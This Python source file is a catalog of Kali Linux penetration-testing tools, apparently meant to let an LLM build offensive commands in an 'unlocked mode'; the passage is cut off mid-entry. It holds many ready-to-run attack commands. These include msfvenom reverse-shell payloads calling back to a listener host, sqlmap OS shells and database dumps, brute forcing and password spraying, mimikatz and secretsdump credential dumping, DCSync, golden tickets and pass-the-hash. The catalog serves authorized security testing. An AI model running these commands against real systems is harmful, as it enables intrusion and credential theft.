"""Kali Linux tool catalog — maps tool names to usage patterns.

Unlocked mode gives the LLM knowledge of these tools so it can recommend
and construct commands for authorized offensive testing.

Covers both authenticated and unauthenticated penetration testing phases
following PTES (Penetration Testing Execution Standard) methodology.
"""

from __future__ import annotations

TOOL_CATALOG: list[dict] = [
    # ══════════════════════════════════════════════════════════
    # PHASE 1: RECONNAISSANCE (Passive & Active)
    # ══════════════════════════════════════════════════════════
    # ── Passive Recon / OSINT ────────────────────────────────
    {
        "name": "theHarvester",
        "category": "osint",
        "description": "OSINT gathering — emails, subdomains, IPs from public sources",
        "auth": "none",
        "examples": [
            "theHarvester -d {target} -b all",
            "theHarvester -d {target} -b google,bing,shodan,censys",
            "theHarvester -d {target} -b linkedin -l 500",
        ],
        "flags": {
            "-d": "Target domain",
            "-b": "Data sources (google,bing,shodan,censys,linkedin,etc)",
            "-l": "Result limit",
            "-f": "Output file",
        },
    },
    {
        "name": "amass",
        "category": "osint",
        "description": (
            "Attack surface mapping — subdomain enumeration"
            " via passive and active sources"
        ),
        "auth": "none",
        "examples": [
            "amass enum -passive -d {target}",
            "amass enum -active -d {target} -brute -w /usr/share/wordlists/subdomains.txt",
            "amass intel -whois -d {target}",
            "amass viz -d3 -d {target}",
        ],
        "flags": {
            "enum": "Subdomain enumeration",
            "intel": "Intelligence gathering",
            "-passive": "Passive only (no DNS resolution)",
            "-active": "Active enumeration",
            "-brute": "Brute force subdomains",
            "-d": "Target domain",
        },
    },
    {
        "name": "subfinder",
        "category": "osint",
        "description": "Fast passive subdomain discovery using multiple sources",
        "auth": "none",
        "examples": [
            "subfinder -d {target} -all",
            "subfinder -d {target} -o subdomains.txt",
            "subfinder -dL domains.txt -all -o all_subs.txt",
        ],
        "flags": {
            "-d": "Target domain",
            "-dL": "Domain list file",
            "-all": "Use all sources",
            "-o": "Output file",
        },
    },
    {
        "name": "recon-ng",
        "category": "osint",
        "description": "Web reconnaissance framework — modular OSINT collection",
        "auth": "none",
        "examples": [
            "recon-ng -w {target}_workspace",
            "recon-cli -m recon/domains-hosts/hackertarget -o SOURCE={target} -x",
            "recon-cli -m recon/hosts-hosts/resolve -x",
        ],
        "flags": {
            "-w": "Workspace name",
            "-m": "Module to load",
            "-o": "Module options",
        },
    },
    {
        "name": "spiderfoot",
        "category": "osint",
        "description": "Automated OSINT collection — 200+ modules for footprinting",
        "auth": "none",
        "examples": [
            "spiderfoot -l 127.0.0.1:5001",
            "spiderfoot -s {target} -t EMAILADDR,INTERNET_NAME -o csv",
        ],
        "flags": {
            "-s": "Scan target",
            "-t": "Data types to collect",
            "-o": "Output format",
            "-l": "Listener address for web UI",
        },
    },
    # ── Active Recon / Network Scanning ──────────────────────
    {
        "name": "nmap",
        "category": "recon",
        "description": (
            "Network mapper — host discovery, port scanning,"
            " service/version detection, OS fingerprinting, NSE scripts"
        ),
        "auth": "none",
        "examples": [
            "nmap -sV -sC -O -oA scan {target}",
            "nmap -sn {target}/24",
            "nmap -p- --min-rate 1000 -oA full_tcp {target}",
            "nmap -sU --top-ports 100 {target}",
            "nmap --script vuln {target}",
            "nmap --script smb-vuln*,smb-enum* -p 445 {target}",
            "nmap --script ssl-enum-ciphers -p 443 {target}",
            "nmap -sV --script=banner -p 1-65535 {target}",
        ],
        "flags": {
            "-sV": "Service version detection",
            "-sC": "Default scripts",
            "-O": "OS detection",
            "-sn": "Ping sweep (no port scan)",
            "-p-": "All 65535 ports",
            "-sU": "UDP scan",
            "-A": "Aggressive (OS, version, scripts, traceroute)",
            "--script": "Run NSE scripts",
            "-T4": "Faster timing",
            "--min-rate": "Minimum packets per second",
            "-oA": "Output all formats (nmap, xml, grepable)",
            "-sS": "SYN stealth scan",
            "-Pn": "Skip host discovery (treat all as online)",
        },
    },
    {
        "name": "masscan",
        "category": "recon",
        "description": "High-speed TCP port scanner — scans entire internet in under 6 minutes",
        "auth": "none",
        "examples": [
            "masscan {target}/24 -p 1-65535 --rate 1000 -oL results.txt",
            "masscan {target} -p 80,443,8080 --rate 500 --banners",
            "masscan {target}/16 --top-ports 100 --rate 10000",
        ],
        "flags": {
            "--rate": "Packets per second",
            "-p": "Port specification",
            "--banners": "Grab banners",
            "-oL": "Output list format",
            "--top-ports": "Scan most common N ports",
        },
    },
    {
        "name": "rustscan",
        "category": "recon",
        "description": "Ultra-fast port scanner — finds open ports then hands off to nmap",
        "auth": "none",
        "examples": [
            "rustscan -a {target} -- -sV -sC",
            "rustscan -a {target} -r 1-65535 --ulimit 5000",
        ],
        "flags": {
            "-a": "Target address",
            "-r": "Port range",
            "--ulimit": "File descriptor limit",
        },
    },
    # ── DNS Enumeration ──────────────────────────────────────
    {
        "name": "dnsrecon",
        "category": "recon",
        "description": "DNS enumeration — zone transfers, brute force, cache snooping",
        "auth": "none",
        "examples": [
            "dnsrecon -d {target}",
            "dnsrecon -d {target} -t axfr",
            "dnsrecon -d {target} -t brt -D /usr/share/wordlists/subdomains.txt",
            "dnsrecon -d {target} -t srv",
        ],
        "flags": {
            "-d": "Target domain",
            "-t": "Type (std, axfr, brt, srv, rvl)",
            "-D": "Dictionary for brute force",
        },
    },
    {
        "name": "fierce",
        "category": "recon",
        "description": "DNS reconnaissance — find non-contiguous IP space and hostnames",
        "auth": "none",
        "examples": [
            "fierce --domain {target}",
            "fierce --domain {target} --subdomains www mail vpn",
        ],
        "flags": {
            "--domain": "Target domain",
            "--subdomains": "Specific subdomains to check",
            "--dns-servers": "Custom DNS servers",
        },
    },
    # ── SMB / NetBIOS Enumeration ────────────────────────────
    {
        "name": "enum4linux",
        "category": "recon",
        "description": (
            "Windows/Samba enumeration — users, shares,"
            " groups, policies (unauthenticated)"
        ),
        "auth": "none",
        "examples": [
            "enum4linux -a {target}",
            "enum4linux -U {target}",
            "enum4linux -S {target}",
            "enum4linux -u 'user' -p 'pass' -a {target}",
        ],
        "flags": {
            "-a": "Full enumeration",
            "-U": "User listing",
            "-S": "Share listing",
            "-P": "Password policy",
            "-u": "Username (for authenticated enum)",
            "-p": "Password (for authenticated enum)",
        },
    },
    {
        "name": "enum4linux-ng",
        "category": "recon",
        "description": "Next-gen enum4linux — better output, LDAP support, YAML/JSON export",
        "auth": "both",
        "examples": [
            "enum4linux-ng -A {target}",
            "enum4linux-ng -u 'user' -p 'pass' -A {target}",
            "enum4linux-ng -A {target} -oY output.yaml",
        ],
        "flags": {
            "-A": "All enumeration",
            "-u": "Username",
            "-p": "Password",
            "-oY": "YAML output",
        },
    },
    {
        "name": "smbmap",
        "category": "recon",
        "description": "SMB share enumeration — list shares, permissions, download files",
        "auth": "both",
        "examples": [
            "smbmap -H {target}",
            "smbmap -H {target} -u 'user' -p 'pass'",
            "smbmap -H {target} -u 'user' -p 'pass' -r 'C$'",
            "smbmap -H {target} -u 'user' -p 'pass' --download 'C$/path/file.txt'",
        ],
        "flags": {
            "-H": "Target host",
            "-u": "Username",
            "-p": "Password",
            "-r": "Recurse into share",
            "--download": "Download a file",
            "-x": "Execute command via SMB",
        },
    },
    {
        "name": "smbclient",
        "category": "recon",
        "description": "SMB client — connect to shares, browse files, upload/download",
        "auth": "both",
        "examples": [
            "smbclient -L //{target} -N",
            "smbclient //{target}/share -U 'user%pass'",
            "smbclient //{target}/share -U 'domain/user%pass' -c 'recurse; prompt; mget *'",
        ],
        "flags": {
            "-L": "List shares",
            "-N": "No password (null session)",
            "-U": "Username (user%pass or domain/user%pass)",
            "-c": "Command to execute",
        },
    },
    {
        "name": "rpcclient",
        "category": "recon",
        "description": "Windows RPC client — enumerate users, groups, SIDs, password policy",
        "auth": "both",
        "examples": [
            "rpcclient -U '' -N {target}",
            "rpcclient -U 'user%pass' {target} -c 'enumdomusers'",
            "rpcclient -U 'user%pass' {target} -c 'enumdomgroups'",
            "rpcclient -U 'user%pass' {target} -c 'getdompwinfo'",
        ],
        "flags": {
            "-U": "Username (user%pass)",
            "-N": "No password",
            "-c": "Command to execute",
        },
    },
    # ── SNMP ─────────────────────────────────────────────────
    {
        "name": "snmpwalk",
        "category": "recon",
        "description": "SNMP enumeration — system info, interfaces, routing, processes",
        "auth": "none",
        "examples": [
            "snmpwalk -v2c -c public {target}",
            "snmpwalk -v2c -c public {target} 1.3.6.1.2.1.1",
            "snmpwalk -v3 -u user -l authPriv -a SHA -A authpass -x AES -X privpass {target}",
        ],
        "flags": {
            "-v2c": "SNMP version 2c",
            "-v3": "SNMP version 3",
            "-c": "Community string",
            "-u": "SNMPv3 username",
        },
    },
    {
        "name": "onesixtyone",
        "category": "recon",
        "description": "SNMP community string brute-forcer",
        "auth": "none",
        "examples": [
            "onesixtyone -c /usr/share/wordlists/community.txt {target}",
            "onesixtyone -c community.txt -i targets.txt",
        ],
        "flags": {
            "-c": "Community string wordlist",
            "-i": "Target list file",
        },
    },
    # ── Web Recon ────────────────────────────────────────────
    {
        "name": "whatweb",
        "category": "recon",
        "description": "Web technology fingerprinting — CMS, frameworks, servers, scripts",
        "auth": "none",
        "examples": [
            "whatweb {target}",
            "whatweb -a 3 {target}",
            "whatweb -v {target} --log-json=output.json",
        ],
        "flags": {
            "-a": "Aggression level (1=stealthy, 3=aggressive)",
            "-v": "Verbose",
        },
    },
    {
        "name": "httpx",
        "category": "recon",
        "description": "HTTP probe — fast check of live web servers with tech detection",
        "auth": "none",
        "examples": [
            "httpx -l subdomains.txt -status-code -title -tech-detect",
            "httpx -u {target} -ports 80,443,8080,8443 -title -status-code",
            "echo {target} | httpx -follow-redirects -title -status-code -content-length",
        ],
        "flags": {
            "-l": "Input list",
            "-u": "Single target",
            "-ports": "Ports to probe",
            "-status-code": "Show status codes",
            "-title": "Show page titles",
            "-tech-detect": "Technology detection",
            "-follow-redirects": "Follow HTTP redirects",
        },
    },
    # ══════════════════════════════════════════════════════════
    # PHASE 2: VULNERABILITY ANALYSIS
    # ══════════════════════════════════════════════════════════
    {
        "name": "nikto",
        "category": "vuln-scan",
        "description": "Web server scanner — misconfigurations, dangerous files, outdated software",
        "auth": "none",
        "examples": [
            "nikto -h http://{target}",
            "nikto -h https://{target} -ssl",
            "nikto -h {target} -p 8080",
            "nikto -h {target} -Tuning 9 -o report.html -Format html",
        ],
        "flags": {
            "-h": "Target host",
            "-p": "Port",
            "-ssl": "Force SSL",
            "-Tuning": "Scan tuning (1-9)",
            "-o": "Output file",
            "-Format": "Output format (html, csv, xml)",
        },
    },
    {
        "name": "nuclei",
        "category": "vuln-scan",
        "description": (
            "Template-based vulnerability scanner"
            " — fast, extensible, community templates"
        ),
        "auth": "both",
        "examples": [
            "nuclei -u http://{target} -as",
            "nuclei -u http://{target} -t cves/ -severity critical,high",
            "nuclei -l targets.txt -t exposures/,misconfigurations/ -severity critical,high",
            "nuclei -u http://{target} -t http/technologies/ -tags tech",
            "nuclei -u http://{target} -H 'Authorization: Bearer TOKEN'",
        ],
        "flags": {
            "-u": "Target URL",
            "-l": "Target list file",
            "-t": "Template directory/file",
            "-severity": "Filter by severity",
            "-tags": "Filter by tags",
            "-as": "Automatic template selection",
            "-H": "Custom header (for auth)",
        },
    },
    {
        "name": "searchsploit",
        "category": "vuln-scan",
        "description": "Exploit-DB CLI — search for known exploits by software/version",
        "auth": "none",
        "examples": [
            "searchsploit apache 2.4",
            "searchsploit openssh 7",
            "searchsploit -m 12345",
            "searchsploit --nmap scan-results.xml",
            "searchsploit -j wordpress 5",
        ],
        "flags": {
            "-m": "Mirror (copy) exploit to current directory",
            "--nmap": "Parse nmap XML output for auto-search",
            "-w": "Show URL instead of local path",
            "-j": "JSON output",
        },
    },
    {
        "name": "testssl",
        "category": "vuln-scan",
        "description": "SSL/TLS configuration testing — ciphers, protocols, vulnerabilities",
        "auth": "none",
        "examples": [
            "testssl.sh {target}:443",
            "testssl.sh --full {target}",
            "testssl.sh -U {target}",
            "testssl.sh --heartbleed --ccs --robot {target}",
        ],
        "flags": {
            "--full": "Full test",
            "-U": "Check for vulnerabilities",
            "--heartbleed": "Test Heartbleed",
            "--ccs": "Test CCS injection",
            "--robot": "Test ROBOT",
        },
    },
    {
        "name": "nessus",
        "category": "vuln-scan",
        "description": (
            "Comprehensive vulnerability scanner"
            " — credentialed and uncredentialed scans"
        ),
        "auth": "both",
        "examples": [
            "# Start Nessus service",
            "systemctl start nessusd",
            "# Access web UI at https://localhost:8834",
            "# CLI: nessuscli scan --targets {target} --policy 'Basic Network Scan'",
        ],
        "flags": {},
    },
    {
        "name": "openvas",
        "category": "vuln-scan",
        "description": "Open-source vulnerability scanner — NVT-based comprehensive scanning",
        "auth": "both",
        "examples": [
            "gvm-start",
            (
                "gvm-cli socket --xml '<create_target>"
                "<name>target</name><hosts>{target}</hosts>"
                "</create_target>'"
            ),
        ],
        "flags": {},
    },
    # ══════════════════════════════════════════════════════════
    # PHASE 3: WEB APPLICATION TESTING
    # ══════════════════════════════════════════════════════════
    {
        "name": "burpsuite",
        "category": "web",
        "description": (
            "Web application security testing platform"
            " — proxy, scanner, intruder, repeater"
        ),
        "auth": "both",
        "examples": [
            "burpsuite &",
            "# Configure browser proxy to 127.0.0.1:8080",
            "# Use Crawler for authenticated scanning with session tokens",
        ],
        "flags": {},
    },
    {
        "name": "gobuster",
        "category": "web",
        "description": "Directory, DNS, and virtual host brute-forcing",
        "auth": "both",
        "examples": [
            "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
            (
                "gobuster dir -u http://{target}"
                " -w /usr/share/seclists/Discovery/Web-Content/"
                "raft-medium-directories.txt -x php,asp,aspx,jsp,html,txt"
            ),
            "gobuster dns -d {target} -w /usr/share/wordlists/subdomains.txt",
            "gobuster vhost -u http://{target} -w /usr/share/wordlists/vhosts.txt",
            "gobuster dir -u http://{target} -w wordlist.txt -c 'session=COOKIE_VALUE'",
        ],
        "flags": {
            "dir": "Directory brute-force mode",
            "dns": "DNS subdomain brute-force",
            "vhost": "Virtual host brute-force",
            "-w": "Wordlist path",
            "-t": "Thread count",
            "-x": "File extensions to search",
            "-c": "Cookies for authenticated scanning",
            "-H": "Custom header",
        },
    },
    {
        "name": "ffuf",
        "category": "web",
        "description": (
            "Fast web fuzzer — directory discovery,"
            " parameter brute-forcing, virtual hosts"
        ),
        "auth": "both",
        "examples": [
            "ffuf -u http://{target}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
            "ffuf -u http://{target}/FUZZ -w wordlist.txt -fc 404 -mc 200,301,302",
            (
                "ffuf -u 'http://{target}/api?FUZZ=test'"
                " -w /usr/share/seclists/Discovery/"
                "Web-Content/burp-parameter-names.txt"
            ),
            (
                "ffuf -u http://{target}/FUZZ -w wordlist.txt"
                " -b 'session=TOKEN' -H 'Authorization: Bearer TOKEN'"
            ),
            (
                "ffuf -u http://{target}/api/user/FUZZ"
                " -w /usr/share/seclists/Fuzzing/Databases/NoSQL.txt"
                " -mc all -fc 400"
            ),
        ],
        "flags": {
            "-u": "URL with FUZZ keyword",
            "-w": "Wordlist",
            "-fc": "Filter by status code",
            "-mc": "Match by status code",
            "-t": "Thread count",
            "-rate": "Requests per second",
            "-b": "Cookie header",
            "-H": "Custom header",
            "-X": "HTTP method",
            "-d": "POST data",
        },
    },
    {
        "name": "sqlmap",
        "category": "web",
        "description": "Automated SQL injection detection and exploitation",
        "auth": "both",
        "examples": [
            "sqlmap -u 'http://{target}/page?id=1' --dbs",
            "sqlmap -u 'http://{target}/page?id=1' --tables -D dbname",
            "sqlmap -u 'http://{target}/page?id=1' --dump -D dbname -T users",
            "sqlmap -r request.txt --batch --level 5 --risk 3",
            "sqlmap -u 'http://{target}/page?id=1' --os-shell",
            (
                "sqlmap -u 'http://{target}/login'"
                " --data='user=admin&pass=test'"
                " --cookie='session=TOKEN' --batch"
            ),
        ],
        "flags": {
            "-u": "Target URL with parameter",
            "-r": "HTTP request file (from Burp)",
            "--dbs": "Enumerate databases",
            "--tables": "Enumerate tables",
            "--dump": "Dump table data",
            "--batch": "Non-interactive mode",
            "--level": "Test level (1-5)",
            "--risk": "Risk level (1-3)",
            "--os-shell": "OS command shell via SQL injection",
            "--cookie": "HTTP cookie",
            "--data": "POST data",
            "--tamper": "Tamper script for WAF bypass",
        },
    },
    {
        "name": "wpscan",
        "category": "web",
        "description": "WordPress vulnerability scanner — plugins, themes, users, brute force",
        "auth": "both",
        "examples": [
            "wpscan --url http://{target} -e vp,vt,u",
            "wpscan --url http://{target} -e vp --plugins-detection aggressive",
            (
                "wpscan --url http://{target}"
                " --passwords /usr/share/wordlists/rockyou.txt"
                " --usernames admin"
            ),
            "wpscan --url http://{target} --api-token YOUR_TOKEN -e vp,vt,tt,cb,dbe",
        ],
        "flags": {
            "--url": "Target WordPress URL",
            "-e": "Enumerate (vp=plugins, vt=themes, u=users, cb=config backups, dbe=db exports)",
            "--passwords": "Password list for brute force",
            "--usernames": "Username or username list",
            "--api-token": "WPScan API token for vuln data",
            "--plugins-detection": "Detection mode (passive, mixed, aggressive)",
        },
    },
    {
        "name": "xsstrike",
        "category": "web",
        "description": "Advanced XSS detection — fuzzing, context analysis, WAF bypass",
        "auth": "both",
        "examples": [
            "xsstrike -u 'http://{target}/search?q=test'",
            "xsstrike -u 'http://{target}/search?q=test' --crawl",
            (
                "xsstrike -u 'http://{target}/page'"
                " --data 'input=test'"
                " --headers 'Cookie: session=TOKEN'"
            ),
        ],
        "flags": {
            "-u": "Target URL",
            "--crawl": "Crawl and test all forms",
            "--data": "POST data",
            "--headers": "Custom headers",
        },
    },
    {
        "name": "commix",
        "category": "web",
        "description": "Automated OS command injection exploitation",
        "auth": "both",
        "examples": [
            "commix -u 'http://{target}/page?cmd=test'",
            "commix -u 'http://{target}/page' --data='input=test' --cookie='session=TOKEN'",
            "commix -r request.txt --batch",
        ],
        "flags": {
            "-u": "Target URL",
            "--data": "POST data",
            "--cookie": "Cookie string",
            "-r": "HTTP request file",
            "--batch": "Non-interactive",
        },
    },
    {
        "name": "dalfox",
        "category": "web",
        "description": "Parameter analysis and XSS scanner with DOM analysis",
        "auth": "both",
        "examples": [
            "dalfox url 'http://{target}/search?q=test'",
            "dalfox file targets.txt",
            "dalfox url 'http://{target}/page' -b 'session=TOKEN' --custom-payload payloads.txt",
        ],
        "flags": {
            "url": "Single URL mode",
            "file": "File with URLs",
            "-b": "Cookie",
            "--custom-payload": "Custom XSS payloads",
        },
    },
    # ══════════════════════════════════════════════════════════
    # PHASE 4: EXPLOITATION
    # ══════════════════════════════════════════════════════════
    {
        "name": "metasploit",
        "category": "exploitation",
        "description": (
            "Penetration testing framework"
            " — exploit development, delivery, post-exploitation"
        ),
        "auth": "both",
        "examples": [
            (
                "msfconsole -q -x 'use exploit/multi/handler;"
                " set PAYLOAD windows/x64/meterpreter/reverse_tcp;"
                " set LHOST {lhost}; set LPORT 4444; run'"
            ),
            "msfconsole -q -x 'search type:exploit name:apache; exit'",
            (
                "msfconsole -q -x 'use exploit/windows/smb/"
                "ms17_010_eternalblue; set RHOSTS {target}; check'"
            ),
            (
                "msfvenom -p linux/x64/shell_reverse_tcp"
                " LHOST={lhost} LPORT=4444 -f elf -o shell.elf"
            ),
            (
                "msfvenom -p windows/x64/meterpreter/reverse_tcp"
                " LHOST={lhost} LPORT=4444 -f exe -o shell.exe"
            ),
            "msfvenom -p php/meterpreter_reverse_tcp LHOST={lhost} LPORT=4444 -f raw -o shell.php",
        ],
        "flags": {
            "-q": "Quiet mode",
            "-x": "Execute commands",
            "search": "Search modules",
            "use": "Select module",
            "set": "Set option",
            "check": "Check if target is vulnerable without exploiting",
        },
    },
    # ══════════════════════════════════════════════════════════
    # PHASE 5: PASSWORD ATTACKS (Online & Offline)
    # ══════════════════════════════════════════════════════════
    # ── Online Brute Force ───────────────────────────────────
    {
        "name": "hydra",
        "category": "password",
        "description": (
            "Online password brute-forcing"
            " — SSH, FTP, HTTP, SMB, RDP, LDAP, and 50+ protocols"
        ),
        "auth": "none",
        "examples": [
            "hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} ssh",
            "hydra -L users.txt -P passwords.txt {target} ftp",
            (
                "hydra -l admin -P passwords.txt {target}"
                " http-post-form"
                " '/login:user=^USER^&pass=^PASS^:F=incorrect'"
            ),
            "hydra -l admin -P passwords.txt {target} rdp",
            "hydra -L users.txt -P passwords.txt {target} smb",
            "hydra -l admin -P passwords.txt {target} mysql",
            "hydra -l admin -P passwords.txt {target} mssql",
        ],
        "flags": {
            "-l": "Single username",
            "-L": "Username list",
            "-p": "Single password",
            "-P": "Password list",
            "-t": "Parallel tasks",
            "-V": "Verbose",
            "-f": "Stop on first valid pair",
            "-s": "Port",
        },
    },
    {
        "name": "medusa",
        "category": "password",
        "description": "Parallel network login brute-forcer — modular design",
        "auth": "none",
        "examples": [
            "medusa -h {target} -u admin -P /usr/share/wordlists/rockyou.txt -M ssh",
            "medusa -h {target} -U users.txt -P passwords.txt -M ftp",
        ],
        "flags": {
            "-h": "Target host",
            "-u": "Username",
            "-U": "Username file",
            "-P": "Password file",
            "-M": "Module (ssh, ftp, http, etc)",
        },
    },
    {
        "name": "crackmapexec",
        "category": "password",
        "description": "Swiss army knife for pentesting Windows/AD — SMB, WinRM, LDAP, MSSQL, SSH",
        "auth": "both",
        "examples": [
            "crackmapexec smb {target}/24",
            "crackmapexec smb {target} -u 'user' -p 'pass'",
            "crackmapexec smb {target} -u 'user' -p 'pass' --shares",
            "crackmapexec smb {target} -u 'user' -p 'pass' --sam",
            "crackmapexec smb {target} -u users.txt -p passwords.txt --continue-on-success",
            "crackmapexec winrm {target} -u 'user' -p 'pass' -x 'whoami'",
            "crackmapexec ldap {target} -u 'user' -p 'pass' --users",
            "crackmapexec mssql {target} -u 'sa' -p 'pass' --local-auth -x 'whoami'",
            "crackmapexec smb {target} -u 'user' -H 'NTHASH' --pass-the-hash",
        ],
        "flags": {
            "-u": "Username or username file",
            "-p": "Password or password file",
            "-H": "NTLM hash",
            "--shares": "Enumerate shares",
            "--sam": "Dump SAM database",
            "--lsa": "Dump LSA secrets",
            "--pass-the-hash": "Use hash for authentication",
            "-x": "Execute command",
            "--users": "Enumerate domain users",
            "--continue-on-success": "Keep trying after valid cred found",
        },
    },
    {
        "name": "netexec",
        "category": "password",
        "description": "CrackMapExec successor — modern network service exploitation",
        "auth": "both",
        "examples": [
            "nxc smb {target} -u 'user' -p 'pass' --shares",
            "nxc smb {target} -u 'user' -H 'HASH' --sam",
            "nxc ldap {target} -u 'user' -p 'pass' --bloodhound -c all",
            "nxc winrm {target} -u 'user' -p 'pass' -x 'whoami /all'",
        ],
        "flags": {
            "-u": "Username",
            "-p": "Password",
            "-H": "NTLM hash",
            "--shares": "Enumerate shares",
            "--sam": "Dump SAM",
            "--bloodhound": "Collect BloodHound data",
        },
    },
    # ── Offline Cracking ─────────────────────────────────────
    {
        "name": "john",
        "category": "password",
        "description": "John the Ripper — offline password hash cracking",
        "auth": "none",
        "examples": [
            "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
            "john --format=NT hashes.txt",
            "john --show hashes.txt",
            "john --rules=best64 --wordlist=passwords.txt hashes.txt",
            "unshadow /etc/passwd /etc/shadow > unshadowed.txt && john unshadowed.txt",
        ],
        "flags": {
            "--wordlist": "Dictionary file",
            "--format": "Hash format",
            "--show": "Show cracked passwords",
            "--rules": "Apply word mangling rules",
        },
    },
    {
        "name": "hashcat",
        "category": "password",
        "description": "GPU-accelerated password hash cracking",
        "auth": "none",
        "examples": [
            "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
            "hashcat -m 1000 -a 0 ntlm_hashes.txt wordlist.txt",
            "hashcat -m 0 -a 3 hashes.txt '?a?a?a?a?a?a'",
            "hashcat -m 13100 -a 0 kerberoast_hashes.txt wordlist.txt",
            "hashcat -m 18200 -a 0 asrep_hashes.txt wordlist.txt",
            "hashcat -m 5600 -a 0 ntlmv2_hashes.txt wordlist.txt",
        ],
        "flags": {
            "-m": "Hash type (0=MD5, 1000=NTLM, 5600=NTLMv2, 13100=Kerberoast, 18200=AS-REP)",
            "-a": "Attack mode (0=dictionary, 1=combination, 3=brute-force, 6=hybrid)",
            "--show": "Show cracked results",
            "-r": "Rules file",
        },
    },
    # ── Kerberos / AD Authentication ─────────────────────────
    {
        "name": "kerbrute",
        "category": "password",
        "description": (
            "Kerberos brute-force — user enumeration"
            " and password spraying via Kerberos pre-auth"
        ),
        "auth": "none",
        "examples": [
            "kerbrute userenum -d domain.local --dc {target} users.txt",
            "kerbrute passwordspray -d domain.local --dc {target} users.txt 'Password123!'",
            "kerbrute bruteuser -d domain.local --dc {target} passwords.txt admin",
        ],
        "flags": {
            "userenum": "Enumerate valid usernames",
            "passwordspray": "Spray single password against users",
            "bruteuser": "Brute force single user",
            "-d": "Domain",
            "--dc": "Domain controller",
        },
    },
    # ══════════════════════════════════════════════════════════
    # PHASE 6: ACTIVE DIRECTORY ATTACKS
    # ══════════════════════════════════════════════════════════
    {
        "name": "bloodhound",
        "category": "ad-attack",
        "description": (
            "Active Directory attack path mapping"
            " — visualize privilege escalation paths"
        ),
        "auth": "authenticated",
        "examples": [
            "bloodhound-python -u 'user' -p 'pass' -d domain.local -ns {target} -c all",
            "bloodhound-python -u 'user' -p 'pass' -d domain.local -c all --zip",
            "neo4j console & bloodhound",
        ],
        "flags": {
            "-u": "Username",
            "-p": "Password",
            "-d": "Domain",
            "-ns": "Nameserver (DC)",
            "-c": "Collection method (all, group, session, acl, trusts)",
            "--zip": "Compress output",
        },
    },
    {
        "name": "impacket",
        "category": "ad-attack",
        "description": "Python toolkit for Windows protocols — SMB, MSRPC, Kerberos, LDAP, MSSQL",
        "auth": "authenticated",
        "examples": [
            "impacket-psexec domain/user:password@{target}",
            "impacket-wmiexec domain/user:password@{target}",
            "impacket-smbexec domain/user:password@{target}",
            "impacket-secretsdump domain/user:password@{target}",
            "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL",
            "impacket-smbclient domain/user:password@{target}",
            "impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip {target}",
            "impacket-GetUserSPNs domain/user:password -dc-ip {target} -request",
            "impacket-getTGT domain/user:password -dc-ip {target}",
            "impacket-dcomexec domain/user:password@{target}",
            "impacket-atexec domain/user:password@{target} 'whoami'",
            "impacket-reg domain/user:password@{target} query -keyName HKLM\\\\SAM",
            "impacket-ntlmrelayx -t {target} -smb2support",
        ],
        "flags": {},
    },
    {
        "name": "rubeus",
        "category": "ad-attack",
        "description": "Kerberos abuse toolkit — ticket attacks, delegation, roasting",
        "auth": "authenticated",
        "examples": [
            "Rubeus.exe kerberoast /outfile:hashes.txt",
            "Rubeus.exe asreproast /outfile:hashes.txt",
            "Rubeus.exe harvest /interval:30",
            "Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:admin /msdsspn:cifs/{target}",
            "Rubeus.exe ptt /ticket:ticket.kirbi",
            "Rubeus.exe dump /nowrap",
        ],
        "flags": {
            "kerberoast": "Request and crack service tickets",
            "asreproast": "Roast accounts without pre-auth",
            "harvest": "Monitor and harvest TGTs",
            "s4u": "S4U constrained delegation abuse",
            "ptt": "Pass-the-ticket",
            "dump": "Dump all tickets from memory",
        },
    },
    {
        "name": "mimikatz",
        "category": "ad-attack",
        "description": "Windows credential extraction — LSASS dump, pass-the-hash, golden ticket",
        "auth": "authenticated",
        "examples": [
            "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'",
            "mimikatz.exe 'privilege::debug' 'lsadump::sam' 'exit'",
            (
                "mimikatz.exe 'privilege::debug'"
                " 'lsadump::dcsync /domain:domain.local"
                " /user:krbtgt' 'exit'"
            ),
            (
                "mimikatz.exe 'kerberos::golden /user:admin"
                " /domain:domain.local /sid:S-1-5-..."
                " /krbtgt:HASH /ptt'"
            ),
            "mimikatz.exe 'sekurlsa::pth /user:admin /domain:domain.local /ntlm:HASH'",
        ],
        "flags": {
            "privilege::debug": "Enable debug privilege",
            "sekurlsa::logonpasswords": "Dump plaintext passwords from LSASS",
            "lsadump::sam": "Dump SAM database",
            "lsadump::dcsync": "DCSync attack (replicate DC)",
            "kerberos::golden": "Create golden ticket",
            "sekurlsa::pth": "Pass-the-hash",
        },
    },
    {
        "name": "certipy",
        "category": "ad-attack",
        "description": "Active Directory Certificate Services (AD CS) exploitation",
        "auth": "authenticated",
        "examples": [
            "certipy find -u 'user@domain.local' -p 'pass' -dc-ip {target} -vulnerable",
            (
                "certipy req -u 'user@domain.local' -p 'pass'"
                " -ca 'CA-NAME' -template 'vuln-template'"
                " -upn 'admin@domain.local'"
            ),
            "certipy auth -pfx admin.pfx -dc-ip {target}",
        ],
        "flags": {
            "find": "Find vulnerable certificate templates",
            "req": "Request certificate",
            "auth": "Authenticate with certificate",
            "-vulnerable": "Only show vulnerable templates",
        },
    },
    {
        "name": "ldapsearch",
        "category": "ad-attack",
        "description": "LDAP directory enumeration — users, groups, GPOs, trusts",
        "auth": "both",
        "examples": [
            "ldapsearch -x -H ldap://{target} -b 'dc=domain,dc=local'",
            (
                "ldapsearch -x -H ldap://{target}"
                " -D 'user@domain.local' -w 'pass'"
                " -b 'dc=domain,dc=local' '(objectClass=user)'"
            ),
            (
                "ldapsearch -x -H ldap://{target}"
                " -D 'user@domain.local' -w 'pass'"
                " -b 'dc=domain,dc=local'"
                " '(userAccountControl"
                ":1.2.840.113556.1.4.803:=4194304)'"
            ),
            (
                "ldapsearch -x -H ldap://{target}"
                " -D 'user@domain.local' -w 'pass'"
                " -b 'dc=domain,dc=local'"
                " '(servicePrincipalName=*)'"
                " sAMAccountName servicePrincipalName"
            ),
        ],
        "flags": {
            "-x": "Simple authentication",
            "-H": "LDAP URI",
            "-D": "Bind DN",
            "-w": "Password",
            "-b": "Search base",
        },
    },
    {
